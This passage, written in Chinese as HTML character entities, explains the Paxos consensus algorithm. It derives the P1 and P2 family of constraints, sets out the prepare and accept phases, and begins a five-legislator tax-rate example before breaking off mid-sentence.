&#x4E8E;&#x662F;&#x4EA7;&#x751F;&#x4E86;&#x4E00;&#x4E2A;&#x663E;&#x800C;&#x6613;&#x89C1;&#x7684;&#x65B0;&#x7EA6;&#x675F;&#xFF1A;1P1&#xFF1A;&#x4E00;&#x4E2A;acceptor&#x5FC5;&#x987B;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x7B2C;&#x4E00;&#x6B21;&#x6536;&#x5230;&#x7684;&#x63D0;&#x6848;&#x3002; &#x6CE8;&#x610F;P1&#x662F;&#x4E0D;&#x5B8C;&#x5907;&#x7684;&#x3002;&#x5982;&#x679C;&#x6070;&#x597D;&#x4E00;&#x534A;acceptor&#x63A5;&#x53D7;&#x7684;&#x63D0;&#x6848;&#x5177;&#x6709;value A&#xFF0C;&#x53E6;&#x4E00;&#x534A;&#x63A5;&#x53D7;&#x7684;&#x63D0;&#x6848;&#x5177;&#x6709;value B&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x65E0;&#x6CD5;&#x5F62;&#x6210;&#x591A;&#x6570;&#x6D3E;&#xFF0C;&#x65E0;&#x6CD5;&#x6279;&#x51C6;&#x4EFB;&#x4F55;&#x4E00;&#x4E2A;value&#x3002; &#x7EA6;&#x675F;2&#x5E76;&#x4E0D;&#x8981;&#x6C42;&#x53EA;&#x6279;&#x51C6;&#x4E00;&#x4E2A;&#x63D0;&#x6848;&#xFF0C;&#x6697;&#x793A;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x591A;&#x4E2A;&#x63D0;&#x6848;&#x3002;&#x53EA;&#x8981;&#x63D0;&#x6848;&#x7684;value&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF0C;&#x6279;&#x51C6;&#x591A;&#x4E2A;&#x63D0;&#x6848;&#x4E0D;&#x8FDD;&#x80CC;&#x7EA6;&#x675F;2&#x3002;&#x4E8E;&#x662F;&#x53EF;&#x4EE5;&#x4EA7;&#x751F;&#x7EA6;&#x675F;P2&#xFF1A;1P2&#xFF1A;&#x4E00;&#x65E6;&#x4E00;&#x4E2A;&#x5177;&#x6709;value v&#x7684;&#x63D0;&#x6848;&#x88AB;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#xFF0C;&#x90A3;&#x4E48;&#x4E4B;&#x540E;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#x7684;&#x63D0;&#x6848;&#x5FC5;&#x987B;&#x5177;&#x6709;value v&#x3002; &#x6CE8;&#xFF1A;&#x901A;&#x8FC7;&#x67D0;&#x79CD;&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x4E3A;&#x6BCF;&#x4E2A;&#x63D0;&#x6848;&#x5206;&#x914D;&#x4E00;&#x4E2A;&#x7F16;&#x53F7;&#xFF0C;&#x5728;&#x63D0;&#x6848;&#x4E4B;&#x95F4;&#x5EFA;&#x7ACB;&#x4E00;&#x4E2A;&#x5168;&#x5E8F;&#x5173;&#x7CFB;&#xFF0C;&#x6240;&#x8C13;&#x201C;&#x4E4B;&#x540E;&#x201D;&#x90FD;&#x662F;&#x6307;&#x6240;&#x6709;&#x7F16;&#x53F7;&#x66F4;&#x5927;&#x7684;&#x63D0;&#x6848;&#x3002; &#x5982;&#x679C;P1&#x548C;P2&#x90FD;&#x80FD;&#x591F;&#x4FDD;&#x8BC1;&#xFF0C;&#x90A3;&#x4E48;&#x7EA6;&#x675F;2&#x5C31;&#x80FD;&#x591F;&#x4FDD;&#x8BC1;&#x3002; &#x6279;&#x51C6;&#x4E00;&#x4E2A;value&#x610F;&#x5473;&#x7740;&#x591A;&#x4E2A;acceptor&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x4E86;&#x8BE5;value.&#x56E0;&#x6B64;&#xFF0C;&#x53EF;&#x4EE5;&#x5BF9;P2&#x8FDB;&#x884C;&#x52A0;&#x5F3A;&#xFF1A;1P2a&#xFF1A;&#x4E00;&#x65E6;&#x4E00;&#x4E2A;&#x5177;&#x6709;value v&#x7684;&#x63D0;&#x6848;&#x88AB;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#xFF0C;&#x90A3;&#x4E48;&#x4E4B;&#x540E;&#x4EFB;&#x4F55;acceptor&#x518D;&#x6B21;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x7684;&#x63D0;&#x6848;&#x5FC5;&#x987B;&#x5177;&#x6709;value v&#x3002; &#x7531;&#x4E8E;&#x901A;&#x4FE1;&#x662F;&#x5F02;&#x6B65;&#x7684;&#xFF0C;P2a&#x548C;P1&#x4F1A;&#x53D1;&#x751F;&#x51B2;&#x7A81;&#x3002;&#x5982;&#x679C;&#x4E00;&#x4E2A;value&#x88AB;&#x6279;&#x51C6;&#x540E;&#xFF0C;&#x4E00;&#x4E2A;proposer&#x548C;&#x4E00;&#x4E2A;acceptor&#x4ECE;&#x4F11;&#x7720;&#x4E2D;&#x82CF;&#x9192;&#xFF0C;&#x524D;&#x8005;&#x63D0;&#x51FA;&#x4E00;&#x4E2A;&#x5177;&#x6709;&#x65B0;&#x7684;value&#x7684;&#x63D0;&#x6848;&#x3002;&#x6839;&#x636E;P1&#xFF0C;&#x540E;&#x8005;&#x5E94;&#x5F53;&#x63A5;&#x53D7;&#xFF0C;&#x6839;&#x636E;P2a&#xFF0C;&#x5219;&#x4E0D;&#x5E94;&#x5F53;&#x63A5;&#x53D7;&#xFF0C;&#x8FD9;&#x4E2D;&#x573A;&#x666F;&#x4E0B;P2a&#x548C;P1&#x6709;&#x77DB;&#x76FE;&#x3002;&#x4E8E;&#x662F;&#x9700;&#x8981;&#x6362;&#x4E2A;&#x601D;&#x8DEF;&#xFF0C;&#x8F6C;&#x800C;&#x5BF9;proposer&#x7684;&#x884C;&#x4E3A;&#x8FDB;&#x884C;&#x7EA6;&#x675F;&#xFF1A;1P2b&#xFF1A;&#x4E00;&#x65E6;&#x4E00;&#x4E2A;&#x5177;&#x6709;value v&#x7684;&#x63D0;&#x6848;&#x88AB;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#xFF0C;&#x90A3;&#x4E48;&#x4EE5;&#x540E;&#x4EFB;&#x4F55;proposer&#x63D0;&#x51FA;&#x7684;&#x63D0;&#x6848;&#x5FC5;&#x987B;&#x5177;&#x6709;value v&#x3002; &#x7531;&#x4E8E;acceptor&#x80FD;&#x63A5;&#x53D7;&#x7684;&#x63D0;&#x6848;&#x90FD;&#x5FC5;&#x987B;&#x7531;proposer&#x63D0;&#x51FA;&#xFF0C;&#x6240;&#x4EE5;P2b&#x8574;&#x6DB5;&#x4E86;P2a&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x66F4;&#x5F3A;&#x7684;&#x7EA6;&#x675F;&#x3002;&#x4F46;&#x662F;&#x6839;&#x636E;P2b&#x96BE;&#x4EE5;&#x63D0;&#x51FA;&#x5B9E;&#x73B0;&#x624B;&#x6BB5;&#x3002;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x8FDB;&#x4E00;&#x6B65;&#x52A0;&#x5F3A;P2b&#x3002; &#x5047;&#x8BBE;&#x4E00;&#x4E2A;&#x7F16;&#x53F7;&#x4E3A;m&#x7684;value v&#x5DF2;&#x7ECF;&#x83B7;&#x5F97;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#xFF0C;&#x6765;&#x770B;&#x770B;&#x5728;&#x4EC0;&#x4E48;&#x60C5;&#x51B5;&#x4E0B;&#x5BF9;&#x4EFB;&#x4F55;&#x7F16;&#x53F7;&#x4E3A;n&#xFF08;n&gt;m&#xFF09;&#x7684;&#x63D0;&#x6848;&#x90FD;&#x542B;&#x6709;value v&#x3002;&#x56E0;&#x4E3A;m&#x5DF2;&#x7ECF;&#x83B7;&#x5F97;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#xFF0C;&#x663E;&#x7136;&#x5B58;&#x5728;&#x4E00;&#x4E2A;acceptors&#x7684;&#x591A;&#x6570;&#x6D3E;C&#xFF0C;&#x4ED6;&#x4EEC;&#x90FD;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x4E86;v&#x3002;&#x8003;&#x8651;&#x5230;&#x4EFB;&#x4F55;&#x591A;&#x6570;&#x6D3E;&#x90FD;&#x548C;C&#x5177;&#x6709;&#x81F3;&#x5C11;&#x4E00;&#x4E2A;&#x516C;&#x5171;&#x6210;&#x5458;&#xFF0C;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x8574;&#x6DB5;P2b&#x7684;&#x7EA6;&#x675F;P2c&#xFF1A;12P2c&#xFF1A;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x7F16;&#x53F7;&#x4E3A;n&#x7684;&#x63D0;&#x6848;&#x5177;&#x6709;value v&#xFF0C;&#x90A3;&#x4E48;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x591A;&#x6570;&#x6D3E;&#xFF0C;&#x8981;&#x4E48;&#x4ED6;&#x4EEC;&#x4E2D;&#x6240;&#x6709;&#x4EBA;&#x90FD;&#x6CA1;&#x6709;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n &#x7684;&#x4EFB;&#x4F55;&#x63D0;&#x6848;&#xFF0C;&#x8981;&#x4E48;&#x4ED6;&#x4EEC;&#x5DF2;&#x7ECF;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x7684;&#x6240;&#x6709;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n&#x7684;&#x63D0;&#x6848;&#x4E2D;&#x7F16;&#x53F7;&#x6700;&#x5927;&#x7684;&#x90A3;&#x4E2A;&#x63D0;&#x6848;&#x5177;&#x6709;value v&#x3002; &#x53EF;&#x4EE5;&#x7528;&#x6570;&#x5B66;&#x5F52;&#x7EB3;&#x6CD5;&#x8BC1;&#x660E;P2c&#x8574;&#x6DB5;P2b&#xFF1A;&#x5047;&#x8BBE;&#x5177;&#x6709;value v&#x7684;&#x63D0;&#x6848;m&#x83B7;&#x5F97;&#x6279;&#x51C6;&#xFF0C;&#x5F53;n=m+1&#x65F6;&#xFF0C;&#x91C7;&#x7528;&#x53CD;&#x8BC1;&#x6CD5;&#xFF0C;&#x5047;&#x5982;&#x63D0;&#x6848;n&#x4E0D;&#x5177;&#x6709;value v&#xFF0C;&#x800C;&#x662F;&#x5177;&#x6709;value w&#xFF0C;&#x6839;&#x636E;P2c&#xFF0C;&#x5219;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x591A;&#x6570;&#x6D3E;S1&#xFF0C;&#x8981;&#x4E48;&#x4ED6;&#x4EEC;&#x4E2D;&#x6CA1;&#x6709;&#x4EBA;&#x63A5;&#x53D7;&#x8FC7;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n&#x7684;&#x4EFB;&#x4F55;&#x63D0;&#x6848;&#xFF0C;&#x8981;&#x4E48;&#x4ED6;&#x4EEC;&#x5DF2;&#x7ECF;&#x63A5;&#x53D7;&#x7684;&#x6240;&#x6709;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n&#x7684;&#x63D0;&#x6848;&#x4E2D;&#x7F16;&#x53F7;&#x6700;&#x5927;&#x7684;&#x90A3;&#x4E2A;&#x63D0;&#x6848;&#x662F;value w&#x3002;&#x7531;&#x4E8E;S1&#x548C;&#x901A;&#x8FC7;&#x63D0;&#x6848;m&#x65F6;&#x7684;&#x591A;&#x6570;&#x6D3E;C&#x4E4B;&#x95F4;&#x81F3;&#x5C11;&#x6709;&#x4E00;&#x4E2A;&#x516C;&#x5171;&#x7684;acceptor&#xFF0C;&#x6240;&#x4EE5;&#x4EE5;&#x4E0A;&#x4E24;&#x4E2A;&#x6761;&#x4EF6;&#x90FD;&#x4E0D;&#x6210;&#x7ACB;&#xFF0C;&#x5BFC;&#x51FA;&#x77DB;&#x76FE;&#x4ECE;&#x800C;&#x63A8;&#x7FFB;&#x5047;&#x8BBE;&#xFF0C;&#x8BC1;&#x660E;&#x4E86;&#x63D0;&#x6848;n&#x5FC5;&#x987B;&#x5177;&#x6709;value v&#xFF1B; &#x82E5;&#xFF08;m+1&#xFF09;..&#xFF08;N-1&#xFF09;&#x6240;&#x6709;&#x63D0;&#x6848;&#x90FD;&#x5177;&#x6709;value v&#xFF0C;&#x91C7;&#x7528;&#x53CD;&#x8BC1;&#x6CD5;&#xFF0C;&#x5047;&#x5982;&#x65B0;&#x63D0;&#x6848;N&#x4E0D;&#x5177;&#x6709;value v&#xFF0C;&#x800C;&#x662F;&#x5177;&#x6709;value w&#x2019;,&#x6839;&#x636E;P2c&#xFF0C;&#x5219;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x591A;&#x6570;&#x6D3E;S2&#xFF0C;&#x8981;&#x4E48;&#x4ED6;&#x4EEC;&#x6CA1;&#x6709;&#x63A5;&#x53D7;&#x8FC7;m..&#xFF08;N-1&#xFF09;&#x4E2D;&#x7684;&#x4EFB;&#x4F55;&#x63D0;&#x6848;&#xFF0C;&#x8981;&#x4E48;&#x4ED6;&#x4EEC;&#x5DF2;&#x7ECF;&#x63A5;&#x53D7;&#x7684;&#x6240;&#x6709;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;N&#x7684;&#x63D0;&#x6848;&#x4E2D;&#x7F16;&#x53F7;&#x6700;&#x5927;&#x7684;&#x90A3;&#x4E2A;&#x63D0;&#x6848;&#x662F;value w&#x2019;&#x3002;&#x7531;&#x4E8E;S2&#x548C;&#x901A;&#x8FC7;m&#x7684;&#x591A;&#x6570;&#x6D3E;C&#x4E4B;&#x95F4;&#x81F3;&#x5C11;&#x6709;&#x4E00;&#x4E2A;&#x516C;&#x5171;&#x7684;acceptor&#xFF0C;&#x6240;&#x4EE5;&#x81F3;&#x5C11;&#x6709;&#x4E00;&#x4E2A;acceptor&#x66FE;&#x7ECF;&#x63A5;&#x53D7;&#x4E86;m&#xFF0C;&#x4ECE;&#x800C;&#x4E5F;&#x53EF;&#x4EE5;&#x63A8;&#x51FA;S2&#x4E2D;&#x5DF2;&#x63A5;&#x53D7;&#x7684;&#x6240;&#x6709;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n&#x7684;&#x63D0;&#x6848;&#x4E2D;&#x7F16;&#x53F7;&#x6700;&#x5927;&#x7684;&#x90A3;&#x4E2A;&#x63D0;&#x6848;&#x7684;&#x7F16;&#x53F7;&#x8303;&#x56F4;&#x5728;m..&#xFF08;N-1&#xFF09;&#x4E4B;&#x95F4;&#xFF0C;&#x800C;&#x6839;&#x636E;&#x521D;&#x59CB;&#x5047;&#x8BBE;&#xFF0C;m..&#xFF08;N-1&#xFF09;&#x4E4B;&#x95F4;&#x7684;&#x6240;&#x6709;&#x63D0;&#x6848;&#x90FD;&#x5177;&#x6709;value v&#xFF0C;&#x6240;&#x4EE5;S2&#x4E2D;&#x5DF2;&#x63A5;&#x53D7;&#x7684;&#x6240;&#x6709;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n&#x7684;&#x63D0;&#x6848;&#x4E2D;&#x7F16;&#x53F7;&#x6700;&#x5927;&#x7684;&#x90A3;&#x4E2A;&#x63D0;&#x6848;&#x80AF;&#x5B9A;&#x5177;&#x6709;value v&#xFF0C;&#x5BFC;&#x51FA;&#x77DB;&#x76FE;&#x4ECE;&#x800C;&#x63A8;&#x7FFB;&#x65B0;&#x63D0;&#x6848;n&#x4E0D;&#x5177;&#x6709;value v&#x7684;&#x5047;&#x8BBE;&#x3002;&#x6839;&#x636E;&#x6570;&#x5B66;&#x5F52;&#x7EB3;&#x6CD5;&#xFF0C;&#x6211;&#x4EEC;&#x8BC1;&#x660E;&#x4E86;&#x82E5;&#x6EE1;&#x8DB3;P2c&#xFF0C;&#x5219;P2b&#x4E00;&#x5B9A;&#x6EE1;&#x8DB3;&#x3002; P2c&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6D88;&#x606F;&#x4F20;&#x9012;&#x6A21;&#x578B;&#x5B9E;&#x73B0;&#x7684;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x5F15;&#x5165;&#x4E86;P2c&#x540E;&#xFF0C;&#x4E5F;&#x89E3;&#x51B3;&#x4E86;&#x524D;&#x6587;&#x63D0;&#x5230;&#x7684;P1&#x4E0D;&#x5B8C;&#x5907;&#x7684;&#x95EE;&#x9898;&#x3002; &#x7B97;&#x6CD5;&#x7684;&#x5185;&#x5BB9;&#x8981;&#x6EE1;&#x8DB3;P2c&#x7684;&#x7EA6;&#x675F;&#xFF0C;proposer&#x63D0;&#x51FA;&#x4E00;&#x4E2A;&#x63D0;&#x6848;&#x524D;&#xFF0C;&#x9996;&#x5148;&#x8981;&#x548C;&#x8DB3;&#x4EE5;&#x5F62;&#x6210;&#x591A;&#x6570;&#x6D3E;&#x7684;acceptors&#x8FDB;&#x884C;&#x901A;&#x4FE1;&#xFF0C;&#x83B7;&#x5F97;&#x4ED6;&#x4EEC;&#x8FDB;&#x884C;&#x7684;&#x6700;&#x8FD1;&#x4E00;&#x6B21;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x7684;&#x63D0;&#x6848;&#xFF08;prepare&#x8FC7;&#x7A0B;&#xFF09;&#xFF0C;&#x4E4B;&#x540E;&#x6839;&#x636E;&#x56DE;&#x6536;&#x7684;&#x4FE1;&#x606F;&#x51B3;&#x5B9A;&#x8FD9;&#x6B21;&#x63D0;&#x6848;&#x7684;value&#xFF0C;&#x5F62;&#x6210;&#x63D0;&#x6848;&#x5F00;&#x59CB;&#x6295;&#x7968;&#x3002;&#x5F53;&#x83B7;&#x5F97;&#x591A;&#x6570;acceptors&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x540E;&#xFF0C;&#x63D0;&#x6848;&#x83B7;&#x5F97;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#xFF0C;&#x7531;proposer&#x5C06;&#x8FD9;&#x4E2A;&#x6D88;&#x606F;&#x544A;&#x77E5;learner&#x3002;&#x8FD9;&#x4E2A;&#x7B80;&#x7565;&#x7684;&#x8FC7;&#x7A0B;&#x7ECF;&#x8FC7;&#x8FDB;&#x4E00;&#x6B65;&#x7EC6;&#x5316;&#x540E;&#x5C31;&#x5F62;&#x6210;&#x4E86;Paxos&#x7B97;&#x6CD5;&#x3002; &#x5728;&#x4E00;&#x4E2A;paxos&#x5B9E;&#x4F8B;&#x4E2D;&#xFF0C;&#x6BCF;&#x4E2A;&#x63D0;&#x6848;&#x9700;&#x8981;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x7F16;&#x53F7;&#xFF0C;&#x4E14;&#x7F16;&#x53F7;&#x95F4;&#x8981;&#x5B58;&#x5728;&#x5168;&#x5E8F;&#x5173;&#x7CFB;&#x3002;&#x53EF;&#x4EE5;&#x7528;&#x591A;&#x79CD;&#x65B9;&#x6CD5;&#x5B9E;&#x73B0;&#x8FD9;&#x4E00;&#x70B9;&#xFF0C;&#x4F8B;&#x5982;&#x5C06;&#x5E8F;&#x6570;&#x548C;proposer&#x7684;&#x540D;&#x5B57;&#x62FC;&#x63A5;&#x8D77;&#x6765;&#x3002;&#x5982;&#x4F55;&#x505A;&#x5230;&#x8FD9;&#x4E00;&#x70B9;&#x4E0D;&#x5728;Paxos&#x7B97;&#x6CD5;&#x8BA8;&#x8BBA;&#x7684;&#x8303;&#x56F4;&#x4E4B;&#x5185;&#x3002; &#x5982;&#x679C;&#x4E00;&#x4E2A;&#x6CA1;&#x6709;chosen&#x8FC7;&#x4EFB;&#x4F55;proposer&#x63D0;&#x6848;&#x7684;acceptor&#x5728;prepare&#x8FC7;&#x7A0B;&#x4E2D;&#x56DE;&#x7B54;&#x4E86;&#x4E00;&#x4E2A;proposer&#x9488;&#x5BF9;&#x63D0;&#x6848;n&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x5F00;&#x59CB;&#x5BF9;n&#x8FDB;&#x884C;&#x6295;&#x7968;&#x524D;&#xFF0C;&#x53C8;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x4E86;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n&#x7684;&#x53E6;&#x4E00;&#x4E2A;&#x63D0;&#x6848;&#xFF08;&#x4F8B;&#x5982;n-1&#xFF09;&#xFF0C;&#x5982;&#x679C;n-1&#x548C;n&#x5177;&#x6709;&#x4E0D;&#x540C;&#x7684;value&#xFF0C;&#x8FD9;&#x4E2A;&#x6295;&#x7968;&#x5C31;&#x4F1A;&#x8FDD;&#x80CC;P2c&#x3002;&#x56E0;&#x6B64;&#x5728;prepare&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;acceptor&#x8FDB;&#x884C;&#x7684;&#x56DE;&#x7B54;&#x540C;&#x65F6;&#x4E5F;&#x5E94;&#x5305;&#x542B;&#x627F;&#x8BFA;&#xFF1A;&#x4E0D;&#x4F1A;&#x518D;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n&#x7684;&#x63D0;&#x6848;&#x3002;&#x8FD9;&#x662F;&#x5BF9;P1&#x7684;&#x52A0;&#x5F3A;&#xFF1A;1P1a&#xFF1A;&#x5F53;&#x4E14;&#x4EC5;&#x5F53;acceptor&#x6CA1;&#x6709;&#x56DE;&#x5E94;&#x8FC7;&#x7F16;&#x53F7;&#x5927;&#x4E8E;n&#x7684;prepare&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;acceptor&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x7F16;&#x53F7;&#x4E3A;n&#x7684;&#x63D0;&#x6848;&#x3002; &#x73B0;&#x5728;&#x5DF2;&#x7ECF;&#x53EF;&#x4EE5;&#x63D0;&#x51FA;&#x5B8C;&#x6574;&#x7684;&#x7B97;&#x6CD5;&#x4E86;&#x3002; &#x51B3;&#x8BAE;&#x7684;&#x63D0;&#x51FA;&#x4E0E;&#x6279;&#x51C6;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x51B3;&#x8BAE;&#x5206;&#x4E3A;&#x4E24;&#x4E2A;&#x9636;&#x6BB5;&#xFF1A; prepare&#x9636;&#x6BB5;&#xFF1A; proposer&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x63D0;&#x6848;&#x7F16;&#x53F7;n&#x5E76;&#x5C06;prepare&#x8BF7;&#x6C42;&#x53D1;&#x9001;&#x7ED9;acceptors&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x591A;&#x6570;&#x6D3E;&#xFF1B; acceptor&#x6536;&#x5230;prepare&#x6D88;&#x606F;&#x540E;&#xFF0C;&#x5982;&#x679C;&#x63D0;&#x6848;&#x7684;&#x7F16;&#x53F7;&#x5927;&#x4E8E;&#x5B83;&#x5DF2;&#x7ECF;&#x56DE;&#x590D;&#x7684;&#x6240;&#x6709;prepare&#x6D88;&#x606F;&#xFF0C;&#x5219;acceptor&#x5C06;&#x81EA;&#x5DF1;&#x4E0A;&#x6B21;&#x63A5;&#x53D7;&#x7684;&#x63D0;&#x6848;&#x56DE;&#x590D;&#x7ED9;proposer&#xFF0C;&#x5E76;&#x627F;&#x8BFA;&#x4E0D;&#x518D;&#x56DE;&#x590D;&#x5C0F;&#x4E8E;n&#x7684;&#x63D0;&#x6848;&#xFF1B; &#x6279;&#x51C6;&#x9636;&#x6BB5;&#xFF1A; &#x5F53;&#x4E00;&#x4E2A;proposer&#x6536;&#x5230;&#x4E86;&#x591A;&#x6570;acceptors&#x5BF9;prepare&#x7684;&#x56DE;&#x590D;&#x540E;&#xFF0C;&#x5C31;&#x8FDB;&#x5165;&#x6279;&#x51C6;&#x9636;&#x6BB5;&#x3002;&#x5B83;&#x8981;&#x5411;&#x56DE;&#x590D;prepare&#x8BF7;&#x6C42;&#x7684;acceptors&#x53D1;&#x9001;accept&#x8BF7;&#x6C42;&#xFF0C;&#x5305;&#x62EC;&#x7F16;&#x53F7;n&#x548C;&#x6839;&#x636E;P2c&#x51B3;&#x5B9A;&#x7684;value&#xFF08;&#x5982;&#x679C;&#x6839;&#x636E;P2c&#x6CA1;&#x6709;&#x5DF2;&#x7ECF;&#x63A5;&#x53D7;&#x7684;value&#xFF0C;&#x90A3;&#x4E48;&#x5B83;&#x53EF;&#x4EE5;&#x81EA;&#x7531;&#x51B3;&#x5B9A;value&#xFF09;&#x3002; &#x5728;&#x4E0D;&#x8FDD;&#x80CC;&#x81EA;&#x5DF1;&#x5411;&#x5176;&#x4ED6;proposer&#x7684;&#x627F;&#x8BFA;&#x7684;&#x524D;&#x63D0;&#x4E0B;&#xFF0C;acceptor&#x6536;&#x5230;accept&#x8BF7;&#x6C42;&#x540E;&#x5373;&#x63A5;&#x53D7;&#x8FD9;&#x4E2A;&#x8BF7;&#x6C42;&#x3002; &#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x5728;&#x4EFB;&#x4F55;&#x65F6;&#x5019;&#x4E2D;&#x65AD;&#x90FD;&#x53EF;&#x4EE5;&#x4FDD;&#x8BC1;&#x6B63;&#x786E;&#x6027;&#x3002;&#x4F8B;&#x5982;&#x5982;&#x679C;&#x4E00;&#x4E2A;proposer&#x53D1;&#x73B0;&#x5DF2;&#x7ECF;&#x6709;&#x5176;&#x4ED6;proposers&#x63D0;&#x51FA;&#x4E86;&#x7F16;&#x53F7;&#x66F4;&#x9AD8;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x5219;&#x6709;&#x5FC5;&#x8981;&#x4E2D;&#x65AD;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x3002;&#x56E0;&#x6B64;&#x4E3A;&#x4E86;&#x4F18;&#x5316;&#xFF0C;&#x5728;&#x4E0A;&#x8FF0;prepare&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x4E00;&#x4E2A;acceptor&#x53D1;&#x73B0;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x66F4;&#x9AD8;&#x7F16;&#x53F7;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x901A;&#x77E5;proposer&#xFF0C;&#x63D0;&#x9192;&#x5176;&#x4E2D;&#x65AD;&#x8FD9;&#x6B21;&#x63D0;&#x6848;&#x3002; &#x5B9E;&#x4F8B;&#x7528;&#x5B9E;&#x9645;&#x7684;&#x4F8B;&#x5B50;&#x6765;&#x66F4;&#x6E05;&#x6670;&#x5730;&#x63CF;&#x8FF0;&#x4E0A;&#x8FF0;&#x8FC7;&#x7A0B;&#xFF1A;&#x6709;A1, A2, A3, A4, A5 5&#x4F4D;&#x8BAE;&#x5458;&#xFF0C;&#x5C31;&#x7A0E;&#x7387;&#x95EE;&#x9898;&#x8FDB;&#x884C;&#x51B3;&#x8BAE;&#x3002;&#x8BAE;&#x5458;A1&#x51B3;&#x5B9A;&#x5C06;&#x7A0E;&#x7387;&#x5B9A;&#x4E3A;10%,&#x56E0;&#x6B64;&#x5B83;&#x5411;&#x6240;&#x6709;&#x4EBA;&#x53D1;&#x51FA;&#x4E00;&#x4E2A;&#x8349;&#x6848;&#x3002;&#x8FD9;&#x4E2A;&#x8349;&#x6848;&#x7684;&#x5185;&#x5BB9;&#x662F;&#xFF1A;1&#x73B0;&#x6709;&#x7684;&#x7A0E;&#x7387;&#x662F;&#x4EC0;&#x4E48;?&#x5982;&#x679C;&#x6CA1;&#x6709;&#x51B3;&#x5B9A;&#xFF0C;&#x5219;&#x5EFA;&#x8BAE;&#x5C06;&#x5176;&#x5B9A;&#x4E3A;10%.&#x65F6;&#x95F4;&#xFF1A;&#x672C;&#x5C4A;&#x8BAE;&#x4F1A;&#x7B2C;3&#x5E74;3&#x6708;15&#x65E5;;&#x63D0;&#x6848;&#x8005;&#xFF1A;A1 &#x5728;&#x6700;&#x7B80;&#x5355;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6CA1;&#x6709;&#x4EBA;&#x4E0E;&#x5176;&#x7ADE;&#x4E89;;&#x4FE1;&#x606F;&#x80FD;&#x53CA;&#x65F6;&#x987A;&#x5229;&#x5730;&#x4F20;&#x8FBE;&#x5230;&#x5176;&#x5B83;&#x8BAE;&#x5458;&#x5904;&#x3002;&#x4E8E;&#x662F;, A2-A5&#x56DE;&#x5E94;&#xFF1A;1&#x6211;&#x5DF2;&#x6536;&#x5230;&#x4F60;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x7B49;&#x5F85;&#x6700;&#x7EC8;&#x6279;&#x51C6; &#x800C;A1&#x5728;&#x6536;&#x5230;2&#x4EFD;&#x56DE;&#x590D;&#x540E;&#x5C31;&#x53D1;&#x5E03;&#x6700;&#x7EC8;&#x51B3;&#x8BAE;&#xFF1A;1&#x7A0E;&#x7387;&#x5DF2;&#x5B9A;&#x4E3A;10%,&#x65B0;&#x7684;&#x63D0;&#x6848;&#x4E0D;&#x5F97;&#x518D;&#x8BA8;&#x8BBA;&#x672C;&#x95EE;&#x9898;&#x3002; &#x8FD9;&#x5B9E;&#x9645;&#x4E0A;&#x9000;&#x5316;&#x4E3A;&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;&#x3002;&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x5047;&#x8BBE;&#x5728;A1&#x63D0;&#x51FA;&#x63D0;&#x6848;&#x7684;&#x540C;&#x65F6;, 